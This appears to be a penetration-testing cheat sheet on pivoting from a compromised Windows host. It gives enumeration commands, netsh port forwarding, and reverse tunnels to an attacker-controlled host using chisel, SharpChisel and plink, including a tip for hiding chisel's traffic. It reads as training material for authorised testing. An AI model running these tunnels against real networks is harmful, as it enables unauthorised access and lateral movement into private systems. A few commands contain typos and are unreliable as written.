# Pivoting in Windows

## Pivoting in Windows

We may be in a situation where we are in an operating system that has more than one network interface, this could be physical, virtual, or even a container environment. 

### Tunneling/Proxying

Create a proxy type connection through a compromised machine in order to route all traffic into the targeted network.

### Port Forwarding

Create a connection between a local port and a single port on a target.

## Pivoting Enumeration

### Enumerate the ARP Table

The ARP table contains IP addresses of hosts that the target has interacted with recently. We can enumerate it with:

```text
arp -a
```

### Enumerate Name Resolution

On Windows systems, we can find the name resolution mappings in:

```text
C:\Windows\System32\drivers\etc\hosts
```

### Enumerating Network Interface Cards \(NICs\)

First, we must determine which subnets are on the operating system to do that we can enumerate the system network interface cards with DOS/Batch or PowerShell:

```text
ipconfig /all
Get-NetIPConfiguration
```

### Enumerate Hosts

We can perform a ping a sweep to identify which hosts are up:

```text
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
```

* /L = iterate through a command using a range of numbers and accept a replaceable parameter
* %i = replaceable parameter
* \(start, step, end\) = numbers to iterate
* -n 1 = ping one time every host
* -w 200 = timeout
* &gt; nul = filter

> Note: This uses ICMP and some Windows Operating Systems may have ICMP disabled.

Alternatively, we can use nmap with proxychains:

```text
proxychains nmap -top-ports=1000 -sT -Pn 10.5.5.25,30 --open
```

## Pivoting with netsh

[Netsh ](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts#:~:text=Netsh%20is%20a%20command%2Dline,in%20batch%20files%20or%20scripts.)is a command-line scripting utility that allows you to display or modify the network configuration of a computer that is currently running. Netsh commands can be run by typing commands at the netsh prompt and they can be used in batch files or scripts. Remote computers and the local computer can be configured by using netsh commands.

 We can use netsh to forward ports:

1. listenaddress – is a local IP address waiting for a connection.
2. listenport – local listening TCP port \(the connection is waited on it\).
3. connectaddress – is a local or remote IP address \(or DNS name\) to which the incoming connection will be redirected.
4. connectport – is a TCP port to which the connection from listenport is forwarded to.

```text
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
```

_**Example below:**_

First, establish a connection:

```text
# Syntax Simplified
netsh interface portproxy add v4tov4 listenport=1234 listenadress=compromised_IP connectport=second_target_PORT connectaddress=second_target_IP
netsh interface portproxy add v4tov4 listenport=1234 listenaddress=target_ip connectport=445 connectaddress=other_machine_ip

# Example
netsh interface portproxy add v4tov4 listenport=1234 listenaddress=192.168.134.10 connectport=445 connectaddress=172.16.1.50
```

Then verify that the connection has been made with:

```text
C:\Users\first_victim> netstat -anp TCP | find "1234"
```

## Pivoting with chisel

[Chisel ](https://github.com/jpillora/chisel)is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go \(golang\). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

Compiling chisel locally in our host:

```text
git clone https://github.com/jpillora/chisel
cd chisel
go blid -ldflags "-s -w" .
upx brute chisel
```

Let's say that we want to forward the ports 389 and 88 through port 8008 in our host, we can do that with [chisel](https://github.com/jpillora/chisel) by doing this:

```text
user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
```

### Pivoting with SharpChisel

[SharpChisel](https://github.com/shantanu561993/SharpChisel) is a C\# wrapper for chisel:

```text
user@hacker$ ./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
================================================================
server : run the Server Component of chisel 
-p 8080 : run server on port 8080
--key "private": use "private" string to seed the generation of a ECDSA public and private key pair
--auth "user:pass" : Creds required to connect to the server
--reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.
--proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.

user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks
```

## Pivoting with plink

plink is an old networking tool that we can also use for forwarding ports:

```text
# exposes the SMB port of the machine in the port 445 of the SSH Server
plink -l root -pw toor -R 445:127.0.0.1:445 
# exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  

plink -l root -pw mypassword 192.168.18.84 -R
plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445

plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
# redirects the Windows port 445 to Kali on port 22
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   
```

